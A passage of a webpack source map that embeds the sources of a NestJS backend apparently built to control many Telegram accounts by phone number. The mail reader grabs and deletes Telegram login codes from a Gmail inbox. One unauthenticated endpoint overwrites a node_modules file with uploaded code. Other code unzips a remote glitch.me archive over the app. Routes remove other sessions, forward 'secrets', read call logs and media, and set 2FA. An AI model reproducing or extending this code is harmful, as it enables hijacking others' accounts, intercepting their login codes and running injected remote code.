rc/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/middlewares/logger.middleware.ts",".././src/utils.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/platform-express\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external commonjs \"imap\"","../external commonjs \"mongoose\"","../external commonjs \"multer\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"fs\"","../external node-commonjs \"path\"","../webpack/bootstrap",".././src/main.ts"],"sourcesContent":["import * as Imap from 'imap';\nimport { fetchNumbersFromString, parseError, sleep } from '../utils';\n\nexport class MailReader {\n    private static instance: MailReader;\n    private imap: Imap;\n    private isReady: boolean = false;\n    private result: string = '';\n\n    private constructor() {\n        this.imap = new Imap({\n            user: process.env.GMAIL_ADD,\n            password: process.env.GMAIL_PASS,\n            host: 'imap.gmail.com',\n            port: 993,\n            tls: true,\n            tlsOptions: {\n                rejectUnauthorized: false,\n            },\n        });\n\n        this.imap.on('ready', () => {\n            console.log('Mail is Ready');\n            this.isReady = true;\n        });\n\n        this.imap.on('error', (err) => {\n            console.error('SomeError:', err);\n            this.isReady = false;\n        });\n\n        this.imap.on('end', () => {\n            console.log('Connection ended');\n            this.isReady = false;\n        });\n    }\n\n    public static getInstance(): MailReader {\n        if (!MailReader.instance) {\n            MailReader.instance = new MailReader();\n        }\n        return MailReader.instance;\n    }\n\n    public async connectToMail(): Promise<void> {\n        console.log('Connecting to mail server');\n        try {\n            this.imap.connect();\n            this.isReady = true;\n            console.log('Connected to mail server');\n        } catch (err) {\n            console.error('Error connecting to mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async disconnectFromMail(): Promise<void> {\n        console.log('Disconnecting from mail server');\n        try {\n            this.imap.end();\n            this.isReady = false;\n            console.log('Disconnected from mail server');\n        } catch (err) {\n            console.error('Error disconnecting from mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async isMailReady(): Promise<boolean> {\n        return this.isReady;\n    }\n\n    public async getCode(): Promise<string> {\n        console.log(\"MailReady : \", this.isReady)\n        if (!this.isReady) {\n            console.log(\"Re-Connecting mail server\");\n            await this.connectToMail();\n            await sleep(10000);\n        }\n\n        try {\n            await this.openInbox();\n\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\n            console.log('Inbox Opened');\n\n            const results = await new Promise<any[]>((resolve, reject) => {\n                this.imap.search(searchCriteria, (err, results) => {\n                    if (err) {\n                        console.error('Search error:', parseError(err));\n                        reject(err);\n                    } else {\n                        resolve(results);\n                    }\n                });\n            });\n\n            if (results.length > 0) {\n                console.log('Emails found:', results.length);\n                const length = results.length;\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\n\n                await new Promise<void>((resolve, reject) => {\n                    fetch.on('message', (msg, seqno) => {\n                        const emailData: string[] = [];\n\n                        msg.on('body', (stream, info) => {\n                            let buffer = '';\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\n                            stream.on('end', () => {\n                                if (info.which === 'TEXT') {\n                                    emailData.push(buffer);\n                                }\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\n                                    if (err) reject(err);\n                                    this.imap.expunge((err) => {\n                                        if (err) reject(err);\n                                        console.log('Deleted message');\n                                    });\n                                });\n                            });\n                        });\n\n                        msg.once('end', () => {\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\n                            console.log('EmailDataLength:', emailData.length);\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\n                            resolve();\n                        });\n                    });\n\n                    fetch.once('end', () => {\n                        console.log('Fetched mails');\n                        resolve();\n                    });\n                });\n            } else {\n                console.log('No new emails found');\n            }\n\n            console.log('Returning result:', this.result);\n            return this.result;\n        } catch (error) {\n            console.error('Error:', error);\n            this.isReady = false;\n            throw error;\n        }\n    }\n\n    private async openInbox(): Promise<void> {\n        await new Promise<void>((resolve, reject) => {\n            this.imap.openBox('INBOX', false, (err) => {\n                if (err) {\n                    console.error('Open Inbox error:', parseError(err));\n                    reject(err);\n                } else {\n                    console.log('Inbox opened');\n                    resolve();\n                }\n            });\n        });\n    }\n}","import { Controller, Get, Param, Post, Query, UploadedFile, UploadedFiles, UseInterceptors } from '@nestjs/common';\nimport { AppService } from './app.service';\nimport { FileInterceptor, FilesInterceptor } from '@nestjs/platform-express';\nimport { ApiOperation, ApiParam, ApiQuery, ApiConsumes, ApiBody } from '@nestjs/swagger';\nimport { existsSync, mkdirSync, promises as fs } from 'fs';\nimport { diskStorage, File as MulterFile } from 'multer';\nimport { join } from 'path';\n\n@Controller()\nexport class AppController {\n    private readonly commonServicePath = join(__dirname, '..', 'node_modules', 'commonService', 'index.js');\n\n    constructor(private readonly appService: AppService) {}\n\n    @Get()\n    getHello(): string {\n        return this.appService.getHello();\n    }\n\n    @Post('updateCommonService')\n    @UseInterceptors(\n        FileInterceptor('file', {\n            storage: diskStorage({\n                destination: (req, file, cb) => {\n                    try {\n                        const folderPath = join(__dirname, '..', 'uploads');\n                        if (!existsSync(folderPath)) {\n                            mkdirSync(folderPath, { recursive: true });\n                        }\n                        cb(null, folderPath);\n                    } catch (error) {\n                        cb(error, null);\n                    }\n                },\n                filename: (req, file, cb) => {\n                    cb(null, 'index.js');\n                },\n            }),\n        }),\n    )\n    @ApiOperation({ summary: 'Upload a file to update commonService index.js' })\n    @ApiConsumes('multipart/form-data')\n    @ApiBody({\n        schema: {\n            type: 'object',\n            properties: {\n                file: { type: 'string', format: 'binary' },\n            },\n        },\n    })\n    async uploadFileAndUpdate(@UploadedFile() file: MulterFile): Promise<{ message: string }> {\n        try {\n            const targetDir = join(__dirname, '..', 'node_modules', 'commonService');\n            const filePath = join(targetDir, 'index.js');\n\n            // Ensure the target directory exists\n            if (!existsSync(targetDir)) {\n                mkdirSync(targetDir, { recursive: true });\n            }\n\n            // Read the uploaded file\n            const fileBuffer = await fs.readFile(file.path);\n\n            // Write to the target location\n            await fs.writeFile(filePath, fileBuffer);\n\n            console.log('commonService/index.js updated successfully.');\n            return { message: 'commonService/index.js updated successfully' };\n        } catch (error) {\n            console.error('Failed to update commonService/index.js:', error);\n            throw error;\n        }\n    }\n\n}\n","import { MiddlewareConsumer, Module, NestModule } from '@nestjs/common';\nimport { UsersModule } from './components/users/users.module';\nimport { UserDataModule } from './components/user-data/user-data.module';\nimport { ClientModule } from './components/clients/client.module';\nimport { TelegramModule } from './components/Telegram/Telegram.module';\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\nimport { ArchivedClientModule } from './components/archived-clients/archived-client.module';\nimport { initModule } from './components/ConfigurationInit/init.module';\nimport { ChannelsModule } from './components/channels/channels.module';\nimport { AppController } from './app.controller';\nimport { AppService } from './app.service';\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\nimport { BuildModule } from './components/builds/build.module';\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\nimport { StatModule } from './components/stats/stat.module';\nimport { Stat2Module } from './components/stats2/stat2.module';\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\nimport { TgSignupModule } from './components/TgSignup/TgSignup.module';\nimport { TransactionModule } from './components/transactions/transaction.module';\nimport { NpointModule } from './components/n-point/npoint.module';\n\n@Module({\n  imports: [\n    initModule,\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    BuildModule,\n    UpiIdModule,\n    PromoteMsgModule,\n    PromoteStatModule,\n    StatModule,\n    Stat2Module,\n    TgSignupModule,\n    TransactionModule,\n    NpointModule,\n  ],\n  controllers:[AppController],\n  providers:[AppService],\n  exports:[\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    TgSignupModule,\n    TransactionModule\n  ]\n})\nexport class AppModule implements NestModule {\n  configure(consumer: MiddlewareConsumer) {\n    consumer.apply(LoggerMiddleware).forRoutes('*');\n  }\n}","import { Injectable } from '@nestjs/common';\nimport { promises as fs } from 'fs';\nimport { join } from 'path';\nimport { diskStorage, File as MulterFile } from 'multer';\n\n@Injectable()\nexport class AppService {\n  getHello(): string {\n    return 'Hello World!';\n  }\n}\n","console.log(\"in Cloudinary\");\nimport * as cloudinary from 'cloudinary';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport { fetchWithTimeout, parseError } from './utils';\nimport * as AdmZip from 'adm-zip';\n\nexport class CloudinaryService {\n    static instance;\n    resources = new Map();\n\n    constructor() {\n        cloudinary.v2.config({\n            cloud_name: process.env.CL_NAME,\n            api_key: process.env.CL_APIKEY,\n            api_secret: process.env.CL_APISECRET\n        });\n    }\n\n    static async getInstance(name) {\n        if (!CloudinaryService.instance) {\n            CloudinaryService.instance = new CloudinaryService();\n        }\n        await CloudinaryService.instance.getResourcesFromFolder(name);\n        return CloudinaryService.instance;\n    }\n\n    public async downloadAndExtractZip(url: string) {\n        const zipPath = path.resolve(__dirname, 'temp.zip');\n        const extractPath = path.resolve(__dirname, '../');\n    \n        // Download the zip file\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\n        if (response?.status === 200) {\n          fs.writeFileSync(zipPath, response.data);\n          console.log('Zip file downloaded successfully.');\n          // Extract the zip file using adm-zip\n          const zip = new AdmZip(zipPath);\n          zip.extractAllTo(extractPath, true);\n          console.log('Zip file extracted successfully.');\n          fs.unlinkSync(zipPath); // Remove the zip file after extraction\n        } else {\n          throw new Error(`Unable to download zip file from ${url}`);\n        }\n      }\n\n    async getResourcesFromFolder(folderName) {\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\n        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);\n        // await this.findAndSaveResources(folderName, 'image');\n    }\n\n    async createNewFolder(folderName) {\n        await this.createFolder(folderName);\n        await this.uploadFilesToFolder(folderName);\n    }\n\n    async overwriteFile() {\n        const cloudinaryFileId = \"index_nbzca5.js\";\n        const localFilePath = \"./src/test.js\";\n\n        try {\n\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\n                resource_type: 'auto',\n                overwrite: true,\n                invalidate: true,\n                public_id: cloudinaryFileId\n            });\n            console.log(result);\n        } catch (error) {\n            parseError(error)\n        }\n\n    }\n\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\n        try {\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\n            await Promise.all(resources.map(async (resource) => {\n                try {\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\n                } catch (error) {\n                    console.log(resource);\n                    parseError(error)\n                }\n            }));\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    async createFolder(folderName) {\n        try {\n            const result = await cloudinary.v2.api.create_folder(folderName);\n\n            return result;\n        } catch (error) {\n            console.error('Error creating folder:', error);\n            throw error;\n        }\n    }\n\n    // Function to upload files from URLs to a specific folder in Cloudinary\n    async uploadFilesToFolder(folderName) {\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\n            try {\n                const result = await cloudinary.v2.uploader.upload_large(url, {\n                    folder: folderName,\n                    resource_type: 'auto',\n                    public_id: key, // Set the key as the public_id\n                });\n\n                return result;\n            } catch (error) {\n                console.error('Error uploading file:', error);\n                throw error;\n            }\n        });\n\n        try {\n            return await Promise.all(uploadPromises);\n        } catch (error) {\n            console.error('Error uploading files:', error);\n            throw error;\n        }\n    }\n\n    async printResources() {\n        try {\n            this.resources?.forEach((val, key) => {\n                console.log(key, \":\", val);\n            })\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    get(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    getBuffer(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            console.log(error);\n        }\n    }\n}\n\nasync function saveFile(url: string, name: string) {\n    try {\n        const extension = url.substring(url.lastIndexOf('.') + 1);\n        const rootPath = process.cwd();\n        const mypath = path.join(rootPath, `${name}.${extension}`);\n        console.log(mypath);\n\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\n\n        if (res?.statusText === 'OK') {\n            if (!fs.existsSync(mypath)) {\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Saved!!`);\n            } else {\n                fs.unlinkSync(mypath);\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Replaced!!`);\n            }\n        } else {\n            throw new Error(`Unable to download file from ${url}`);\n        }\n    } catch (err) {\n        parseError(err);\n    }\n}\n\n\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type ConfigurationDocument = Configuration & Document;\n\n@Schema({\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Configuration { }\n\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { ConfigurationService } from './init.service';\n\n@ApiTags('Configuration')\n@Controller('configuration')\nexport class ConfigurationController {\n  constructor(private readonly configurationService: ConfigurationService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get configuration data' })\n  async findOne(): Promise<any>{\n    return this.configurationService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update configuration' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.configurationService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global, OnModuleDestroy, Inject, OnModuleInit } from '@nestjs/common';\nimport { ConfigModule } from '@nestjs/config';\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\nimport { ConfigurationService } from './init.service';\nimport { ConfigurationSchema } from './configuration.schema';\nimport { ConfigurationController } from './init.controller';\nimport { Connection } from 'mongoose';\nimport { fetchWithTimeout, ppplbot } from '../../utils';\n\n@Global()\n@Module({\n  imports: [\n    ConfigModule.forRoot(), // Ensure ConfigModule is imported\n    MongooseModule.forRootAsync({\n      useFactory: () => ({\n        uri: process.env.mongouri,\n      }),\n    }),\n    MongooseModule.forFeature([{\n      name: 'configurationModule', collection: 'configuration', schema: ConfigurationSchema\n    }])\n  ],\n  providers: [ConfigurationService],\n  controllers: [ConfigurationController],\n  exports: [ConfigModule, MongooseModule],\n})\nexport class initModule implements OnModuleDestroy, OnModuleInit {\n  constructor(@Inject(getConnectionToken()) private readonly connection: Connection) {}\n  async onModuleInit() {\n    console.log(`Started :: ${process.env.clientId}`)\n    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`);\n  }\n\n  async onModuleDestroy() {\n    console.log(\"Init Module Destroying\")\n    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);\n    this.closeConnection();\n  }\n\n  private closeConnection() {\n    console.log(\"Closing mongoose connection\")\n    this.connection.close(true)\n  }\n}","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Configuration } from './configuration.schema';\nimport { CloudinaryService } from '../../cloudinary';\n\n@Injectable()\nexport class ConfigurationService {\n    constructor(@InjectModel('configurationModule') private configurationModel: Model<Configuration>) {\n        this.setEnv()\n     }\n\n    async OnModuleInit() {\n       console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.configurationModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return user;\n    }\n\n    async setEnv() {\n        console.log(\"Setting Envs\");\n        const configuration: Configuration = await this.configurationModel.findOne({}, { _id: 0 });\n        const data = {...configuration}\n        for (const key in data) {\n            console.log('setting', key)\n            process.env[key] = data[key];\n        }\n        console.log(\"finished setting env\");\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.configurationModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`configurationModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse } from '@nestjs/swagger';\nimport { TelegramService } from './Telegram.service';\nimport * as fs from 'fs';\nimport { AddContactsDto } from './dto/addContacts.dto';\nimport { AddContactDto } from './dto/addContact.dto';\n\n@Controller('telegram')\n@ApiTags('Telegram')\nexport class TelegramController {\n    constructor(\n        private readonly telegramService: TelegramService\n    ) {}\n\n    async connectToTelegram(mobile: string) {\n        return await this.telegramService.createClient(mobile);\n    }\n\n    @Get('connect/:mobile')\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async connectClient(@Param('mobile') mobile: string): Promise<string> {\n        await this.connectToTelegram(mobile);\n        return 'Client connected successfully';\n    }\n\n    @Get('disconnect/:mobile')\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async disconnect(@Param('mobile') mobile: string): Promise<boolean> {\n        return await this.telegramService.deleteClient(mobile);\n    }\n\n    @Get('disconnectAll')\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async disconnectAll(): Promise<string> {\n        await this.telegramService.disconnectAll();\n        return 'Clients disconnected successfully';\n    }\n\n    @Get('messages/:mobile')\n    @ApiOperation({ summary: 'Get messages from Telegram' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'username', description: 'Username to fetch messages from', required: true })\n    @ApiQuery({ name: 'limit', description: 'Limit the number of messages', required: false })\n    //@apiresponse({ status: 200, description: 'Messages fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getMessages(@Param('mobile') mobile: string, @Query('username') username: string, @Query('limit') limit: number = 8) {\n        await this.connectToTelegram(mobile);\n        return this.telegramService.getMessages(mobile, username, limit);\n    }\n\n    @Get('messagesNew/:mobile')\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Username to fetch messages from', required: true })\n    @ApiQuery({ name: 'limit', description: 'Limit the number of messages', required: false })\n    @ApiQuery({ name: 'offset', description: 'offset the number of messages', required: false })\n    async getMessagesNew(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('offset') offset: number,\n        @Query('limit') limit: number = 20\n    ) {\n        await this.telegramService.createClient(mobile, false, false);\n        const messages = await this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\n        return messages;\n    }\n\n    @Get('chatid/:mobile')\n    @ApiOperation({ summary: 'Get chat ID for a username' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'username', description: 'Username to fetch chat ID for', required: true })\n    //@apiresponse({ status: 200, description: 'Chat ID fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getChatId(@Param('mobile') mobile: string, @Query('username') username: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.getChatId(mobile, username);\n    }\n\n    @Get('sendInlineMessage/:mobile')\n    @ApiOperation({ summary: 'Get chat ID for a username' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'chat ID of user', required: true })\n    @ApiQuery({ name: 'message', description: 'message ID of user', required: true })\n    @ApiQuery({ name: 'url', description: 'url ID of user', required: true })\n    async sendInlineMessage(@Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('message') message: string,\n        @Query('url') url: string,) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.sendInlineMessage(mobile, chatId, message, url);\n    }\n\n    @Get('lastActiveTime/:mobile')\n    @ApiOperation({ summary: 'Get Last Active time of a user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    async lastActiveTime(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.getLastActiveTime(mobile);\n    }\n\n    @Post('joinchannels/:mobile')\n    @ApiOperation({ summary: 'Join channels' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ description: 'Channels string', schema: { type: 'object', properties: { channels: { type: 'string' } } } })\n    //@apiresponse({ status: 200, description: 'Channels joined successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async joinChannels(@Param('mobile') mobile: string, @Body('channels') channels: string) {\n        await this.connectToTelegram(mobile);\n        // this.telegramService.joinChannels(mobile, channels);\n        return 'Joining Channels';\n    }\n\n    @Get('removeauths/:mobile')\n    @ApiOperation({ summary: 'Remove other authorizations' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Authorizations removed successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async removeOtherAuths(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        await this.telegramService.removeOtherAuths(mobile);\n        return 'Authorizations removed successfully';\n    }\n\n    @Get('selfmsgsinfo/:mobile')\n    @ApiOperation({ summary: 'Get self messages info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getSelfMsgsInfo(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.getSelfMsgsInfo(mobile);\n    }\n\n    @Get('createGroup/:mobile')\n    @ApiOperation({ summary: 'Get self messages info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async createGroup(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.createGroup(mobile);\n    }\n\n    @Get('forwardSecrets/:mobile/:fromId')\n    @ApiOperation({ summary: 'Get self messages info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async forwardSecrets(@Param('mobile') mobile: string, @Param('fromId') fromId: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.forwardSecrets(mobile, fromId);\n    }\n\n    @Get('joinChannelAndForward/:mobile/:fromId/:channel')\n    @ApiOperation({ summary: 'Get self messages info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async joinChannelAndForward(@Param('mobile') mobile: string, @Param('fromId') fromId: string, @Param('channel') channel: string) {\n        await this.telegramService.createClient(mobile, false, false);\n        return await this.telegramService.joinChannelAndForward(mobile, fromId, channel);\n    }\n    @Get('leaveChannel/:mobile/:channel')\n    @ApiOperation({ summary: 'Get channel info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async leaveChannel(@Param('mobile') mobile: string, @Param('channel') channel: string) {\n        await this.connectToTelegram(mobile);\n        this.telegramService.leaveChannel(mobile, channel);\n        return \"Started Leaving Channels\"\n    }\n\n    @Get('getCallLog/:mobile')\n    @ApiOperation({ summary: 'Get CallLog  info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getCallLog(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.getCallLog(mobile);\n    }\n\n    @Get('getMe/:mobile')\n    @ApiOperation({ summary: 'Get me  info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getMe(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.getMe(mobile);\n    }\n\n    @Get('getMedia/:mobile')\n    @ApiOperation({ summary: 'Get me  info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Self messages info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getMedia(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.getmedia(mobile);\n    }\n\n    @Get('channelinfo/:mobile')\n    @ApiOperation({ summary: 'Get channel info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'sendIds', description: 'Whether to send IDs or not', required: false })\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getChannelInfo(@Param('mobile') mobile: string, @Query('sendIds') sendIds: boolean = false) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.getChannelInfo(mobile, sendIds);\n    }\n\n    @Get('leaveChannels/:mobile')\n    @ApiOperation({ summary: 'Get channel info' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Channel info fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async leaveChannels(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        this.telegramService.leaveChannels(mobile);\n        return \"Started Leaving Channels\"\n    }\n\n    @Get('auths/:mobile')\n    @ApiOperation({ summary: 'Get authorizations' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    //@apiresponse({ status: 200, description: 'Authorizations fetched successfully' })\n    //@apiresponse({ status: 400, description: 'Bad request' })\n    async getAuths(@Param('mobile') mobile: string) {\n        await this.connectToTelegram(mobile);\n        return await this.telegramService.getAuths(mobile);\n    }\n\n    @Get('set2Fa/:mobile')\n    @ApiOperation({ 